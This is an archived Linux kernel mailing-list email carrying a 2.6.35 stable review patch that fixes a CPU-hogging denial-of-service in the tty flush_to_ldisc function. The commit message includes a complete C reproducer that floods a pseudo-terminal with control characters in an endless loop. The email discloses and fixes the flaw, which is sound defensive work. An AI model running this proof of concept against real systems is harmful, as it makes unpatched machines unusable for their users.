Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1756366Ab0LMAOG (ORCPT <rfc822;w@1wt.eu>);
	Sun, 12 Dec 2010 19:14:06 -0500
Received: from one.firstfloor.org ([213.235.205.2]:36070 "EHLO
	one.firstfloor.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1754943Ab0LLXqe (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Sun, 12 Dec 2010 18:46:34 -0500
From: Andi Kleen <andi@firstfloor.org>
References: <201012131244.547034648@firstfloor.org>
In-Reply-To: <201012131244.547034648@firstfloor.org>
To: jolsa@redhat.com, alan@lxorguk.ukuu.org.uk, gregkh@suse.de,
        ak@linux.intel.com, linux-kernel@vger.kernel.org, stable@kernel.org
Subject: [PATCH] [93/223] tty: prevent DOS in the flush_to_ldisc
Message-Id: <20101212234633.1BD09B27BF@basil.firstfloor.org>
Date: Mon, 13 Dec 2010 00:46:33 +0100 (CET)
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

2.6.35-longterm review patch.  If anyone has any objections, please let me know.

------------------
From: Jiri Olsa <jolsa@redhat.com>

commit e045fec48970df84647a47930fcf7a22ff7229c0 upstream.

There's a small window inside the flush_to_ldisc function,
where the tty is unlocked and calling ldisc's receive_buf
function. If in this window new buffer is added to the tty,
the processing might never leave the flush_to_ldisc function.

This scenario will hog the cpu, causing other tty processing
starving, and making it impossible to interface the computer
via tty.

I was able to exploit this via pty interface by sending only
control characters to the master input, causing the flush_to_ldisc
to be scheduled, but never actually generate any output.

To reproduce, please run multiple instances of following code.

- SNIP
#define _XOPEN_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(int argc, char **argv)
{
        int i, slave, master = getpt();
        char buf[8192];

        sprintf(buf, "%s", ptsname(master));
        grantpt(master);
        unlockpt(master);

        slave = open(buf, O_RDWR);
        if (slave < 0) {
                perror("open slave failed");
                return 1;
        }

        for(i = 0; i < sizeof(buf); i++)
                buf[i] = rand() % 32;

        while(1) {
                write(master, buf, sizeof(buf));
        }

        return 0;
}
- SNIP

The attached patch (based on -next tree) fixes this by checking on the
tty buffer tail. Once it's reached, the current work is rescheduled
and another could run.

Signed-off-by: Jiri Olsa <jolsa@redhat.com>
Acked-by: Alan Cox <alan@lxorguk.ukuu.org.uk>
Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>
Signed-off-by: Andi Kleen <ak@linux.intel.com>

---
 drivers/char/tty_buffer.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)

Index: linux/drivers/char/tty_buffer.c
===================================================================
--- linux.orig/drivers/char/tty_buffer.c
+++ linux/drivers/char/tty_buffer.c
@@ -413,7 +413,8 @@ static void flush_to_ldisc(struct work_s
 	spin_lock_irqsave(&tty->buf.lock, flags);
 
 	if (!test_and_set_bit(TTY_FLUSHING, &tty->flags)) {
-		struct tty_buffer *head;
+		struct tty_buffer *head, *tail = tty->buf.tail;
+		int seen_tail = 0;
 		while ((head = tty->buf.head) != NULL) {
 			int count;
 			char *char_buf;
@@ -423,6 +424,15 @@ static void flush_to_ldisc(struct work_s
 			if (!count) {
 				if (head->next == NULL)
 					break;
+				/*
+				  There's a possibility tty might get new buffer
+				  added during the unlock window below. We could
+				  end up spinning in here forever hogging the CPU
+				  completely. To avoid this let's have a rest each
+				  time we processed the tail buffer.
+				*/
+				if (tail == head)
+					seen_tail = 1;
 				tty->buf.head = head->next;
 				tty_buffer_free(tty, head);
 				continue;
@@ -432,7 +442,7 @@ static void flush_to_ldisc(struct work_s
 			   line discipline as we want to empty the queue */
 			if (test_bit(TTY_FLUSHPENDING, &tty->flags))
 				break;
-			if (!tty->receive_room) {
+			if (!tty->receive_room || seen_tail) {
 				schedule_delayed_work(&tty->buf.work, 1);
 				break;
 			}
